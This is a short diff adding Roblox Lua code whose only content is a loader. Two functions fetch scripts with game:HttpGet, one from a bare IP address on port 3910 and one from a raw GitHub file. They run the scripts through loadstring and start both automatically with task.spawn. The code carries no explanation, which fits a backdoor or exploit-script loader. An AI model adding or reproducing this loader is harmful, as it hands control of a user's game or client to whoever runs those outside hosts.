@@ -1,0 +1,8 @@
+local function F()
+  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
+end
+local function pR()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/SCRIPT/refs/heads/main/pRe",true))()
+end
+task.spawn(F)
+task.spawn(pR)
